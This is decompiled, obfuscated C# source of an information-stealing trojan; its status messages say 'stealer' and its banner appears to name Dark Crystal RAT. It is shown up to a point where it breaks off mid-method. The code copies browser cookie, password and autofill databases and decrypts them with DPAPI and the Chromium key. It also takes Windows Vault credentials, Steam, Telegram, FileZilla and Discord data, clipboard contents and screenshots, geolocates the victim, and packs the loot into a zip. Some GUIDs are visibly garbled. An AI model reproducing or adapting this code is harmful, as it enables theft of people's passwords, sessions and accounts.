using GDBD.Bridges;
using GDBD.Importers;
using GDBD.Items;
using GDBD.Mocks;
using GDBD.Specifications;
using GDBD.Workers;
using Newtonsoft.Annotations;
using Newtonsoft.Candidates;
using Newtonsoft.Database;
using Newtonsoft.Expressions;
using Newtonsoft.Filters;
using Newtonsoft.Rules;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.IO.Compression;
using System.Linq;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Security.Principal;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace GDBD.Mappers
{
	internal sealed class Context
	{
		[CompilerGenerated]
		private sealed class _0001
		{
			public ZipArchive _0001;

			public Context _0002;

			[MethodImpl(MethodImplOptions.NoInlining)]
			public _0001()
			{
				//Discarded unreachable code: IL_0002, IL_0006, IL_0012, IL_0019
				//IL_0003: Incompatible stack heights: 0 vs 1
				//IL_0007: Incompatible stack heights: 0 vs 1
				//IL_0013: Incompatible stack heights: 0 vs 1
				//IL_001a: Incompatible stack heights: 0 vs 1
				SingletonReader.PushGlobal();
				base._002Ector();
			}

			[MethodImpl(MethodImplOptions.NoInlining)]
			internal void _0001()
			{
				//Discarded unreachable code: IL_0002
				//IL_0003: Incompatible stack heights: 0 vs 1
				_0002.GetEvent(this._0001, "Clipboard.txt", Encoding.UTF8.GetBytes(Clipboard.GetText(TextDataFormat.UnicodeText)));
			}
		}

		[Serializable]
		[CompilerGenerated]
		private sealed class MapperComposerVisitor
		{
			public static readonly MapperComposerVisitor m_PredicateWriter;

			public static Predicate<string> mappingWriter;

			public static Predicate<string> interceptorWriter;

			public static Predicate<string> m_MockWriter;

			public static Predicate<string> m_InterpreterWriter;

			public static Predicate<string> m_PoolWriter;

			public static Action<int> _RegWriter;

			public static Predicate<string> m_ParamWriter;

			public static Predicate<string> m_ServerWriter;

			public static Func<string, bool> specificationWriter;

			[MethodImpl(MethodImplOptions.NoInlining)]
			static MapperComposerVisitor()
			{
				//Discarded unreachable code: IL_0002, IL_0006, IL_0012, IL_0019
				//IL_0003: Incompatible stack heights: 0 vs 1
				//IL_0007: Incompatible stack heights: 0 vs 1
				//IL_0013: Incompatible stack heights: 0 vs 1
				//IL_001a: Incompatible stack heights: 0 vs 1
				SingletonReader.PushGlobal();
				m_PredicateWriter = new MapperComposerVisitor();
			}

			[MethodImpl(MethodImplOptions.NoInlining)]
			public MapperComposerVisitor()
			{
				//Discarded unreachable code: IL_0002, IL_0006, IL_0012, IL_0019
				//IL_0003: Incompatible stack heights: 0 vs 1
				//IL_0007: Incompatible stack heights: 0 vs 1
				//IL_0013: Incompatible stack heights: 0 vs 1
				//IL_001a: Incompatible stack heights: 0 vs 1
				SingletonReader.PushGlobal();
				base._002Ector();
			}

			[MethodImpl(MethodImplOptions.NoInlining)]
			internal bool _0001(string _0002)
			{
				//Discarded unreachable code: IL_0002
				//IL_0003: Incompatible stack heights: 0 vs 1
				return _0002 == null;
			}

			[MethodImpl(MethodImplOptions.NoInlining)]
			internal bool _0002(string _0002)
			{
				//Discarded unreachable code: IL_0002
				//IL_0003: Incompatible stack heights: 0 vs 1
				return _0002.Contains("Cookies");
			}

			[MethodImpl(MethodImplOptions.NoInlining)]
			internal bool _0003(string _0002)
			{
				//Discarded unreachable code: IL_0002
				//IL_0003: Incompatible stack heights: 0 vs 1
				return _0002.Contains("cookies.sqlite");
			}

			[MethodImpl(MethodImplOptions.NoInlining)]
			internal bool _0004(string _0002)
			{
				//Discarded unreachable code: IL_0002
				//IL_0003: Incompatible stack heights: 0 vs 1
				return _0002.Contains("Login Data");
			}

			[MethodImpl(MethodImplOptions.NoInlining)]
			internal bool _0005(string _0002)
			{
				//Discarded unreachable code: IL_0002
				//IL_0003: Incompatible stack heights: 0 vs 1
				return _0002.Contains("Web Data");
			}

			[MethodImpl(MethodImplOptions.NoInlining)]
			internal void _0001(int _0002)
			{
			}//Discarded unreachable code: IL_0002
			//IL_0003: Incompatible stack heights: 0 vs 1


			[MethodImpl(MethodImplOptions.NoInlining)]
			internal bool _0006(string _0002)
			{
				//Discarded unreachable code: IL_0002
				//IL_0003: Incompatible stack heights: 0 vs 1
				return _0002.Contains("Web Data");
			}

			[MethodImpl(MethodImplOptions.NoInlining)]
			internal bool _0007(string _0002)
			{
				//Discarded unreachable code: IL_0002
				//IL_0003: Incompatible stack heights: 0 vs 1
				return _0002.Contains("History");
			}

			[MethodImpl(MethodImplOptions.NoInlining)]
			internal bool _0008(string _0002)
			{
				//Discarded unreachable code: IL_0002
				//IL_0003: Incompatible stack heights: 0 vs 1
				return Path.GetFileName(_0002) == "loginusers.vdf" || Path.GetFileName(_0002) == "config.vdf";
			}
		}

		[CompilerGenerated]
		private sealed class _0002
		{
			public List<string> _0001;

			public Context _0002;

			[MethodImpl(MethodImplOptions.NoInlining)]
			public _0002()
			{
				//Discarded unreachable code: IL_0002, IL_0006, IL_0012, IL_0019
				//IL_0003: Incompatible stack heights: 0 vs 1
				//IL_0007: Incompatible stack heights: 0 vs 1
				//IL_0013: Incompatible stack heights: 0 vs 1
				//IL_001a: Incompatible stack heights: 0 vs 1
				SingletonReader.PushGlobal();
				base._002Ector();
			}

			[MethodImpl(MethodImplOptions.NoInlining)]
			internal void _0001(string _0002)
			{
				//Discarded unreachable code: IL_0002
				//IL_0003: Incompatible stack heights: 0 vs 1
				try
				{
					this._0001.Add(_0002);
				}
				catch
				{
				}
			}

			[MethodImpl(MethodImplOptions.NoInlining)]
			internal void _0002(string _0002)
			{
				//Discarded unreachable code: IL_0002
				//IL_0003: Incompatible stack heights: 0 vs 1
				try
				{
					this._0001.AddRange(this._0002.StartEvent(_0002));
				}
				catch
				{
				}
			}
		}

		[CompilerGenerated]
		private sealed class _0003
		{
			public Context _0001;

			public ZipArchive _0002;

			[MethodImpl(MethodImplOptions.NoInlining)]
			public _0003()
			{
				//Discarded unreachable code: IL_0002, IL_0006, IL_0012, IL_0019
				//IL_0003: Incompatible stack heights: 0 vs 1
				//IL_0007: Incompatible stack heights: 0 vs 1
				//IL_0013: Incompatible stack heights: 0 vs 1
				//IL_001a: Incompatible stack heights: 0 vs 1
				SingletonReader.PushGlobal();
				base._002Ector();
			}

			[MethodImpl(MethodImplOptions.NoInlining)]
			internal void _0001(string _0002)
			{
				//Discarded unreachable code: IL_0002
				//IL_0003: Incompatible stack heights: 0 vs 1
				this._0001.GetEvent(this._0002, "Other/Steam/" + Path.GetFileName(_0002), File.ReadAllBytes(_0002));
			}

			[MethodImpl(MethodImplOptions.NoInlining)]
			internal void _0002(string _0002)
			{
				//Discarded unreachable code: IL_0002
				//IL_0003: Incompatible stack heights: 0 vs 1
				this._0001.GetEvent(this._0002, "Other/Steam/" + Path.GetFileName(_0002), File.ReadAllBytes(_0002));
			}
		}

		[CompilerGenerated]
		private sealed class _0004
		{
			public Context _0001;

			public ZipArchive _0002;

			[MethodImpl(MethodImplOptions.NoInlining)]
			public _0004()
			{
				//Discarded unreachable code: IL_0002, IL_0006, IL_0012, IL_0019
				//IL_0003: Incompatible stack heights: 0 vs 1
				//IL_0007: Incompatible stack heights: 0 vs 1
				//IL_0013: Incompatible stack heights: 0 vs 1
				//IL_001a: Incompatible stack heights: 0 vs 1
				SingletonReader.PushGlobal();
				base._002Ector();
			}

			[MethodImpl(MethodImplOptions.NoInlining)]
			internal void _0001(string _0002)
			{
				//Discarded unreachable code: IL_0002
				//IL_0003: Incompatible stack heights: 0 vs 1
				this._0001.GetEvent(this._0002, "Other/Telegram/tdata/" + Path.GetFileName(_0002), File.ReadAllBytes(_0002));
			}
		}

		[CompilerGenerated]
		private sealed class _0005
		{
			public string _0001;

			public _0004 _0002;

			[MethodImpl(MethodImplOptions.NoInlining)]
			public _0005()
			{
				//Discarded unreachable code: IL_0002, IL_0006, IL_0012, IL_0019
				//IL_0003: Incompatible stack heights: 0 vs 1
				//IL_0007: Incompatible stack heights: 0 vs 1
				//IL_0013: Incompatible stack heights: 0 vs 1
				//IL_001a: Incompatible stack heights: 0 vs 1
				SingletonReader.PushGlobal();
				base._002Ector();
			}

			[MethodImpl(MethodImplOptions.NoInlining)]
			internal void _0001(string _0002)
			{
				//Discarded unreachable code: IL_0002
				//IL_0003: Incompatible stack heights: 0 vs 1
				this._0002._0001.GetEvent(this._0002._0002, "Other/Telegram/tdata/" + Path.GetFileName(this._0001) + "/" + Path.GetFileName(_0002), File.ReadAllBytes(_0002));
			}
		}

		private List<string> _Param;

		[MethodImpl(MethodImplOptions.NoInlining)]
		public byte[] CalculateEvent(string i, bool regclose, bool ispool, bool isres2, bool calcasset3, bool comparecfg4, bool comparecol5, bool isinstance6, bool getvalue7, bool iscont8, bool containscol9, bool istoken10, bool appendvalue11)
		{
			//Discarded unreachable code: IL_0002
			//IL_0003: Incompatible stack heights: 0 vs 1
			byte[] result = null;
			Stopwatch stopwatch = new Stopwatch();
			stopwatch.Start();
			using (MemoryStream memoryStream = new MemoryStream())
			{
				ZipArchive zipArchive = new ZipArchive(memoryStream, ZipArchiveMode.Create);
				try
				{
					if (regclose || ispool || isres2 || comparecfg4)
					{
						zipArchive.CreateEntry("Browsers/");
						_Param = StartEvent(i);
						Thread.Sleep(1000);
						_Param.RemoveAll((string _0002) => _0002 == null);
					}
					if (comparecol5 || isinstance6 || getvalue7 || iscont8)
					{
						zipArchive.CreateEntry("Other/");
					}
					if (regclose)
					{
						DispatcherInstanceExpression.CancelFilter("stealer", "Fetching cookies...", MappingListAnnotation.m_CandidateEvent, MappingListAnnotation.m_TokenizerEvent);
						TestEvent(zipArchive, _Param);
						ConcatEvent(zipArchive, _Param);
					}
					if (ispool)
					{
						DispatcherInstanceExpression.CancelFilter("stealer", "Fetching passwords...", MappingListAnnotation.m_CandidateEvent, MappingListAnnotation.m_TokenizerEvent);
						CountEvent(zipArchive, _Param);
						PrintEvent(zipArchive, _Param);
						InvokeEvent(zipArchive);
					}
					if (isres2)
					{
						DispatcherInstanceExpression.CancelFilter("stealer", "Fetching forms...", MappingListAnnotation.m_CandidateEvent, MappingListAnnotation.m_TokenizerEvent);
						AssetEvent(zipArchive, _Param);
					}
					if (comparecfg4)
					{
						DispatcherInstanceExpression.CancelFilter("stealer", "Fetching CC...", MappingListAnnotation.m_CandidateEvent, MappingListAnnotation.m_TokenizerEvent);
						CustomizeEvent(zipArchive, _Param);
					}
					if (calcasset3)
					{
						DispatcherInstanceExpression.CancelFilter("stealer", "Fetching History...", MappingListAnnotation.m_CandidateEvent, MappingListAnnotation.m_TokenizerEvent);
						QueryEvent(zipArchive, _Param);
					}
					if (isinstance6)
					{
						zipArchive.CreateEntry("Other/Steam/");
						ExcludeEvent(zipArchive);
					}
					if (comparecol5)
					{
						zipArchive.CreateEntry("Other/Telegram/");
						SetupEvent(zipArchive);
					}
					DispatcherInstanceExpression.CancelFilter("stealer", "Fetching other information...", MappingListAnnotation.m_CandidateEvent, MappingListAnnotation.m_TokenizerEvent);
					try
					{
						foreach (object[] item in DecoratorEventEntry.dic)
						{
							MethodInfo methodInfo = (MethodInfo)item[0];
							List<object[]> list = (List<object[]>)methodInfo.Invoke(item[1], new object[3]
							{
								MappingListAnnotation.m_CandidateEvent,
								MappingListAnnotation.m_TokenizerEvent,
								MappingListAnnotation.m_PolicyEvent
							});
							foreach (object[] item2 in list)
							{
								GetEvent(zipArchive, (string)item2[0], (byte[])item2[1]);
							}
						}
					}
					catch
					{
					}
					try
					{
						if (containscol9)
						{
							zipArchive.CreateEntry("Screenshots/");
							Screen[] allScreens = Screen.AllScreens;
							foreach (Screen screen in allScreens)
							{
								GetEvent(zipArchive, "Screenshots/Screenshot#" + screen.DeviceName.Replace("\\\\.\\", "") + ".jpg", ValClientBridge.PrepareList(ValClientBridge.IncludeList(screen)));
							}
						}
					}
					catch
					{
					}
					try
					{
						if (istoken10)
						{
							Thread thread = new Thread((ThreadStart)delegate
							{
								//Discarded unreachable code: IL_0002
								//IL_0003: Incompatible stack heights: 0 vs 1
								GetEvent(zipArchive, "Clipboard.txt", Encoding.UTF8.GetBytes(Clipboard.GetText(TextDataFormat.UnicodeText)));
							});
							thread.SetApartmentState(ApartmentState.STA);
							thread.Start();
							thread.Join();
						}
					}
					catch
					{
					}
					if (getvalue7)
					{
						GetEvent(zipArchive, "Other/Discord Token(s).txt", Encoding.Default.GetBytes(CancelEvent()));
					}
					if (appendvalue11)
					{
						DecoratorReaderMapper decoratorReaderMapper = DecoratorReaderMapper.PatchRequest(ItemEventEntry.ConcatList("https://ipinfo.io/json"));
						string s = "  ___           _      ___             _        _   ___    _ _____ \r\n |   \\ __ _ _ _| |__  / __|_ _ _  _ __| |_ __ _| | | _ \\  /_\\_   _|\r\n | |) / _` | '_| / / | (__| '_| || (_-<  _/ _` | | |   / / _ \\| |  \r\n |___/\\__,_|_| |_\\_\\  \\___|_|  \\_, /__/\\__\\__,_|_| |_|_\\/_/ \\_\\_|  \r\n                               |__/                                \r\n-------------------------------------------------------------------\r\nGPU Name: " + GlobalIssuerImporter.SelectList() + "\r\nCPU Name: " + GlobalIssuerImporter.StartList() + "\r\nBIOS: " + GlobalIssuerImporter.CalculateList() + "\r\nLANIP: " + GlobalIssuerImporter.DeleteList() + "\r\nAntivirus: " + GlobalIssuerImporter.PostList() + "\r\nFirewall: " + GlobalIssuerImporter.ChangeList() + "\r\nMotherboard: " + GlobalIssuerImporter.GetList() + "\r\nRAM: " + GlobalIssuerImporter.ListList() + "\r\nFramework Version: " + GlobalIssuerImporter.RateList() + "\r\nPath: " + Path.GetDirectoryName(MappingListAnnotation.m_PolicyEvent) + "\r\n\r\nIP: " + decoratorReaderMapper["ip"]?.ToString() + "\r\nCity: " + decoratorReaderMapper["city"]?.ToString() + "\r\nCountry code: " + decoratorReaderMapper["country"]?.ToString() + "\r\nLocation: " + decoratorReaderMapper["loc"];
						GetEvent(zipArchive, "Information [" + decoratorReaderMapper["country"]?.ToString() + ", " + decoratorReaderMapper["city"]?.ToString() + "].txt", Encoding.UTF8.GetBytes(s));
					}
					if (iscont8)
					{
						try
						{
							if (File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData).ToString() + "\\FileZilla\\sitemanager.xml"))
							{
								GetEvent(zipArchive, "Other/FileZilla#sitemanager.xml", File.ReadAllBytes(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData).ToString() + "\\FileZilla\\sitemanager.xml"));
							}
							if (File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData).ToString() + "\\FileZilla\\recentservers.xml"))
							{
								GetEvent(zipArchive, "Other/FileZilla#recentservers.xml", File.ReadAllBytes(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData).ToString() + "\\FileZilla\\recentservers.xml"));
							}
						}
						catch
						{
						}
					}
				}
				finally
				{
					if (zipArchive != null)
					{
						((IDisposable)zipArchive).Dispose();
					}
				}
				result = memoryStream.ToArray();
			}
			stopwatch.Stop();
			_Param = null;
			DispatcherInstanceExpression.CancelFilter("stealer", "Done! Elapsed time: " + stopwatch.Elapsed.ToString(), MappingListAnnotation.m_CandidateEvent, MappingListAnnotation.m_TokenizerEvent);
			return result;
		}

		[MethodImpl(MethodImplOptions.NoInlining)]
		private void GetEvent(ZipArchive info, string cust, byte[] filter)
		{
			//Discarded unreachable code: IL_0002
			//IL_0003: Incompatible stack heights: 0 vs 1
			ZipArchiveEntry zipArchiveEntry = info.CreateEntry(cust);
			using (MemoryStream memoryStream = new MemoryStream(filter))
			{
				using (Stream destination = zipArchiveEntry.Open())
				{
					memoryStream.CopyTo(destination);
				}
			}
		}

		[MethodImpl(MethodImplOptions.NoInlining)]
		private List<string> StartEvent(string res)
		{
			//Discarded unreachable code: IL_0002
			//IL_0003: Incompatible stack heights: 0 vs 1
			List<string> list = new List<string>();
			try
			{
				Parallel.ForEach(Directory.GetFiles(res), delegate(string _0002)
				{
					//Discarded unreachable code: IL_0002
					//IL_0003: Incompatible stack heights: 0 vs 1
					try
					{
						list.Add(_0002);
					}
					catch
					{
					}
				});
			}
			catch
			{
			}
			try
			{
				Parallel.ForEach(Directory.GetDirectories(res), delegate(string _0002)
				{
					//Discarded unreachable code: IL_0002
					//IL_0003: Incompatible stack heights: 0 vs 1
					try
					{
						list.AddRange(StartEvent(_0002));
					}
					catch
					{
					}
				});
			}
			catch
			{
			}
			return list;
		}

		[MethodImpl(MethodImplOptions.NoInlining)]
		private string ListEvent(string value)
		{
			//Discarded unreachable code: IL_0002
			//IL_0003: Incompatible stack heights: 0 vs 1
			string result = "Unknown";
			if (value.Contains("Chrome"))
			{
				result = "Chrome";
			}
			if (value.Contains("Firefox"))
			{
				result = "Firefox";
			}
			if (value.Contains("Tor"))
			{
				result = "Tor";
			}
			if (value.Contains("Waterfox"))
			{
				result = "Waterfox";
			}
			if (value.Contains("Meleon"))
			{
				result = "K-Meleon";
			}
			if (value.Contains("IceDragon"))
			{
				result = "IceDragon";
			}
			if (value.Contains("Yandex"))
			{
				result = "Yandex";
			}
			if (value.Contains("Chromium"))
			{
				result = "Chromium";
			}
			if (value.Contains("Amigo"))
			{
				result = "Amigo";
			}
			if (value.Contains("Safari"))
			{
				result = "Safari";
			}
			if (value.Contains("Opera"))
			{
				result = "Opera";
			}
			if (value.Contains("Opera GX"))
			{
				result = "Opera GX";
			}
			if (value.Contains("Vivaldi"))
			{
				result = "Vivaldi";
			}
			if (value.Contains("Torch"))
			{
				result = "Torch";
			}
			if (value.Contains("Kometa"))
			{
				result = "Kometa";
			}
			if (value.Contains("Steam"))
			{
				result = "Steam WebViewer";
			}
			if (value.Contains("Edge"))
			{
				result = "Chromium Edge";
			}
			return result;
		}

		[MethodImpl(MethodImplOptions.NoInlining)]
		private string SelectEvent(string item, string cont)
		{
			//Discarded unreachable code: IL_0002
			//IL_0003: Incompatible stack heights: 0 vs 1
			string path = string.Empty;
			string[] array = new string[3]
			{
				"",
				"\\..",
				"\\..\\.."
			};
			foreach (string str in array)
			{
				path = Path.GetDirectoryName(item) + str + "\\Local State";
				if (File.Exists(path))
				{
					break;
				}
				path = null;
			}
			byte[] encryptedData = ReponseClassSpec.RevertFilter(Convert.FromBase64String(DecoratorReaderMapper.PatchRequest(File.ReadAllText(path))["os_crypt"]["encrypted_key"].ResetClass<string>()), 0, 5);
			byte[] first = ProtectedData.Unprotect(encryptedData, null, DataProtectionScope.CurrentUser);
			byte[] bytes = Encoding.Default.GetBytes(cont);
			byte[] third = ReponseClassSpec.RevertFilter(ReponseClassSpec.RevertFilter(bytes, 15, bytes.Length - 15), 0, 3);
			byte[] array2 = ReponseClassSpec.RevertFilter(bytes, 0, 15);
			FilterInstanceRule filterInstanceRule = new FilterInstanceRule(new EventInstanceRule());
			DescriptorListAnnotation cfg = new DescriptorListAnnotation(new MapperList(first), 128, third, null);
			filterInstanceRule._0001(isinit: false, cfg);
			byte[] array3 = new byte[filterInstanceRule._0001(array2.Length)];
			int visZ = filterInstanceRule._0001(array2, 0, array2.Length, array3, 0);
			filterInstanceRule._0001(array3, visZ);
			return Encoding.UTF8.GetString(array3).TrimEnd("\r\n\0".ToCharArray());
		}

		[MethodImpl(MethodImplOptions.NoInlining)]
		private string DeleteEvent(string ident)
		{
			//Discarded unreachable code: IL_0002
			//IL_0003: Incompatible stack heights: 0 vs 1
			return Encoding.Default.GetString(ProtectedData.Unprotect(Encoding.Default.GetBytes(ident), null, DataProtectionScope.CurrentUser));
		}

		[MethodImpl(MethodImplOptions.NoInlining)]
		private void TestEvent(ZipArchive info, List<string> b)
		{
			//Discarded unreachable code: IL_0002
			//IL_0003: Incompatible stack heights: 0 vs 1
			try
			{
				List<string> list = b.FindAll((string _0002) => _0002.Contains("Cookies"));
				if (list.Count >= 1)
				{
					foreach (string item in list)
					{
						try
						{
							if (File.Exists(item))
							{
								string text = string.Empty;
								string text2 = Path.GetDirectoryName(MappingListAnnotation.m_PolicyEvent) + "\\" + "KYdrmj8m6J";
								File.Copy(item, text2, overwrite: true);
								try
								{
									string text3 = ListEvent(item);
									FactoryTestItem factoryTestItem = new FactoryTestItem(text2);
									factoryTestItem.RestartList("cookies");
									int num = factoryTestItem.ReadList();
									for (int i = 0; i < num; i++)
									{
										try
										{
											string empty = string.Empty;
											string text4 = factoryTestItem.CalcList(i, 12);
											empty = ((Encoding.Default.GetBytes(text4)[0] != 118) ? DeleteEvent(text4) : SelectEvent(item, text4));
											text = text + factoryTestItem.CalcList(i, 1) + "\tFALSE\t" + factoryTestItem.CalcList(i, 4) + "\t" + factoryTestItem.CalcList(i, 6) + "\t" + factoryTestItem.CalcList(i, 5) + "\t" + factoryTestItem.CalcList(i, 2) + "\t" + empty + "\r\n";
										}
										catch
										{
										}
										Thread.Sleep(3);
									}
									if (text.Length > 5)
									{
										GetEvent(info, (text3 == "Unknown") ? ("Browsers/Unknowns/Cookies [" + text3 + "]#" + "xhAr" + ".txt") : ("Browsers/Cookies [" + text3 + "]#" + "MdAC" + ".txt"), Encoding.Default.GetBytes(text));
									}
								}
								catch
								{
								}
								File.Delete(text2);
							}
						}
						catch
						{
						}
						Thread.Sleep(10);
					}
				}
			}
			catch
			{
			}
		}

		[MethodImpl(MethodImplOptions.NoInlining)]
		private void ConcatEvent(ZipArchive ident, List<string> cust)
		{
			//Discarded unreachable code: IL_0002
			//IL_0003: Incompatible stack heights: 0 vs 1
			try
			{
				List<string> list = cust.FindAll((string _0002) => _0002.Contains("cookies.sqlite"));
				if (list.Count >= 1)
				{
					foreach (string item in list)
					{
						try
						{
							if (File.Exists(item))
							{
								string text = string.Empty;
								string text2 = Path.GetDirectoryName(MappingListAnnotation.m_PolicyEvent) + "\\" + "C5wsmn6dgn";
								File.Copy(item, text2, overwrite: true);
								try
								{
									string text3 = ListEvent(item);
									CodeErrorFilter codeErrorFilter = new CodeErrorFilter(text2);
									codeErrorFilter.InsertEvent("moz_cookies");
									for (int i = 0; i < codeErrorFilter.MoveEvent(); i++)
									{
										try
										{
											text = text + codeErrorFilter.MapEvent(i, "host").Trim() + "\tFALSE\t" + codeErrorFilter.MapEvent(i, "path").Trim() + "\t" + (codeErrorFilter.MapEvent(i, "isSecure") == "1") + "\t" + codeErrorFilter.MapEvent(i, "expiry").Trim() + "\t" + codeErrorFilter.MapEvent(i, "name").Trim() + "\t" + codeErrorFilter.MapEvent(i, "value") + "\r\n";
										}
										catch
										{
										}
										Thread.Sleep(3);
									}
									if (text.Length > 5)
									{
										GetEvent(ident, (text3 == "Unknown") ? ("Browsers/Unknowns/Cookies [" + text3 + "]#" + "aYEQ" + ".txt") : ("Browsers/Cookies [" + text3 + "]#" + "hOmX" + ".txt"), Encoding.Default.GetBytes(text));
									}
								}
								catch
								{
								}
								File.Delete(text2);
							}
						}
						catch
						{
						}
						Thread.Sleep(10);
					}
				}
			}
			catch
			{
			}
		}

		[MethodImpl(MethodImplOptions.NoInlining)]
		private void InvokeEvent(ZipArchive setup)
		{
			//Discarded unreachable code: IL_0002
			//IL_0003: Incompatible stack heights: 0 vs 1
			try
			{
				string text = string.Empty;
				Version version = Environment.OSVersion.Version;
				int major = version.Major;
				int minor = version.Minor;
				Type type = (major < 6 || minor < 2) ? typeof(Publisher.ProductComposerWorker) : typeof(Publisher.RequestIssuerMock);
				int result = 0;
				IntPtr util = IntPtr.Zero;
				if (Publisher.InterruptFilter(0, ref result, ref util) == 0)
				{
					IntPtr ptr = util;
					Dictionary<Guid, string> dictionary = new Dictionary<Guid, string>();
					dictionary.Add(new Guid("2F1A6504-0641-44CF-8BB5-3612D865F2E5"), "Windows Secure Note");
					dictionary.Add(new Guid("3CCD5499-87A8-4B10-A215-608888DD3B55"), "Windows Web Password Credential");
					dictionary.Add(new Guid("154E23D0-C644-4E6F-8CE6-5069272F999F"), "Windows Credential Picker Protector");
					dictionary.Add(new Guid("4BF4C442-9B8A-41A0-B380-DD4A704DDB28"), "Web Credentials");
					dictionary.Add(new Guid("77BC582B-F0A6-4E15-4E80-61736B6F3B29"), "Windows Credentials");
					dictionary.Add(new Guid("E69D7838-91B5-4FC9-89D5-230D4D4CC2BC"), "Windows Domain Certificate Credential");
					dictionary.Add(new Guid("3E0E35BE-1B77-43E7-B873-AED901B6275B"), "Windows Domain Password Credential");
					dictionary.Add(new Guid("3C886GeckoDBStruct3-2669-4AA2-A8FB-3F6759A77548"), "Windows Extended Credential");
					dictionary.Add(new Guid("00000000-0000-0000-0000-000000000000"), null);
					for (int i = 0; i < result; i++)
					{
						object obj = Marshal.PtrToStructure(ptr, typeof(Guid));
						Guid ident = new Guid(obj.ToString());
						ptr = (IntPtr)(ptr.ToInt64() + Marshal.SizeOf(typeof(Guid)));
						IntPtr c = IntPtr.Zero;
						if (dictionary.ContainsKey(ident))
						{
							string text2 = dictionary[ident];
						}
						else
						{
							string text2 = ident.ToString();
						}
						if (Publisher.AwakeFilter(ref ident, 0u, ref c) == 0)
						{
							int comp = 0;
							IntPtr counter = IntPtr.Zero;
							if (Publisher.CalcFilter(c, 512, ref comp, ref counter) == 0)
							{
								IntPtr ptr2 = counter;
								if (comp > 0)
								{
									for (int j = 1; j <= comp; j++)
									{
										object obj2 = Marshal.PtrToStructure(ptr2, type);
										ptr2 = (IntPtr)(ptr2.ToInt64() + Marshal.SizeOf(type));
										IntPtr counter2 = IntPtr.Zero;
										FieldInfo field = obj2.GetType().GetField("SchemaId");
										Guid result2 = new Guid(field.GetValue(obj2).ToString());
										FieldInfo field2 = obj2.GetType().GetField("pResourceElement");
										IntPtr intPtr = (IntPtr)field2.GetValue(obj2);
										FieldInfo field3 = obj2.GetType().GetField("pIdentityElement");
										IntPtr intPtr2 = (IntPtr)field3.GetValue(obj2);
										FieldInfo field4 = obj2.GetType().GetField("LastModified");
										ulong num = (ulong)field4.GetValue(obj2);
										IntPtr intPtr3 = IntPtr.Zero;
										int num2;
										if (major >= 6 && minor >= 2)
										{
											FieldInfo field5 = obj2.GetType().GetField("pPackageSid");
											intPtr3 = (IntPtr)field5.GetValue(obj2);
											num2 = Publisher.InstantiateFilter(c, ref result2, intPtr, intPtr2, intPtr3, IntPtr.Zero, 0, ref counter2);
										}
										else
										{
											num2 = Publisher.ReflectFilter(c, ref result2, intPtr, intPtr2, IntPtr.Zero, 0, ref counter2);
										}
										if (num2 == 0)
										{
											object obj3 = Marshal.PtrToStructure(counter2, type);
											FieldInfo field6 = obj3.GetType().GetField("pAuthenticatorElement");
											IntPtr value = (IntPtr)field6.GetValue(obj3);
											object obj4 = ManageEvent(value);
											object obj5 = null;
											if (intPtr3 != IntPtr.Zero)
											{
												obj5 = ManageEvent(intPtr3);
											}
											if (obj4 != null)
											{
												text = text + "URL: " + ManageEvent(intPtr)?.ToString() + "\r\nLogin: " + ManageEvent(intPtr2)?.ToString() + "\r\nPassword: " + obj4?.ToString() + "\r\n\r\n";
											}
										}
									}
								}
							}
						}
					}
					GetEvent(setup, "Browsers/Passwords [Edge-IE]#" + "NkS2" + ".txt", Encoding.Default.GetBytes(text));
				}
			}
			catch
			{
			}
		}

		[MethodImpl(MethodImplOptions.NoInlining)]
		private void PrintEvent(ZipArchive spec, List<string> pred)
		{
		}//Discarded unreachable code: IL_0002
		//IL_0003: Incompatible stack heights: 0 vs 1


		[MethodImpl(MethodImplOptions.NoInlining)]
		private void CountEvent(ZipArchive res, List<string> cust)
		{
			//Discarded unreachable code: IL_0002
			//IL_0003: Incompatible stack heights: 0 vs 1
			try
			{
				List<string> list = cust.FindAll((string _0002) => _0002.Contains("Login Data"));
				if (list.Count >= 1)
				{
					foreach (string item in list)
					{
						try
						{
							if (File.Exists(item))
							{
								string text = string.Empty;
								string text2 = Path.GetDirectoryName(MappingListAnnotation.m_PolicyEvent) + "\\" + "BACFZi5zCo";
								File.Copy(item, text2, overwrite: true);
								try
								{
									string text3 = ListEvent(item);
									FactoryTestItem factoryTestItem = new FactoryTestItem(text2);
									factoryTestItem.RestartList("logins");
									int num = factoryTestItem.ReadList();
									for (int i = 0; i < num; i++)
									{
										try
										{
											string empty = string.Empty;
											string text4 = factoryTestItem.CalcList(i, 5);
											empty = ((Encoding.Default.GetBytes(text4)[0] != 118) ? DeleteEvent(text4) : SelectEvent(item, text4));
											text = text + "URL: " + factoryTestItem.CalcList(i, 0) + "\r\nLogin: " + factoryTestItem.CalcList(i, 3) + "\r\nPassword: " + empty + "\r\n\r\n";
										}
										catch
										{
										}
										Thread.Sleep(3);
									}
									if (text.Length > 5)
									{
										GetEvent(res, (text3 == "Unknown") ? ("Browsers/Unknowns/Passwords [" + text3 + "]#" + "lcv0" + ".txt") : ("Browsers/Passwords [" + text3 + "]#" + "RI57" + ".txt"), Encoding.Default.GetBytes(text));
									}
								}
								catch
								{
								}
								File.Delete(text2);
							}
						}
						catch
						{
						}
						Thread.Sleep(10);
					}
				}
			}
			catch
			{
			}
		}

		[MethodImpl(MethodImplOptions.NoInlining)]
		private void AssetEvent(ZipArchive value, List<string> vis)
		{
			//Discarded unreachable code: IL_0002
			//IL_0003: Incompatible stack heights: 0 vs 1
			try
			{
				List<string> list = vis.FindAll((string _0002) => _0002.Contains("Web Data"));
				if (list.Count >= 1)
				{
					foreach (string item in list)
					{
						try
						{
							if (File.Exists(item))
							{
								string text = string.Empty;
								string text2 = Path.GetDirectoryName(MappingListAnnotation.m_PolicyEvent) + "\\" + "vJDUErgyCm";
								File.Copy(item, text2, overwrite: true);
								try
								{
									string text3 = ListEvent(item);
									FactoryTestItem factoryTestItem = new FactoryTestItem(text2);
									factoryTestItem.RestartList("autofill");
									int num = factoryTestItem.ReadList();
									Parallel.For(0, num, (Action<int>)delegate
									{
									}//Discarded unreachable code: IL_0002
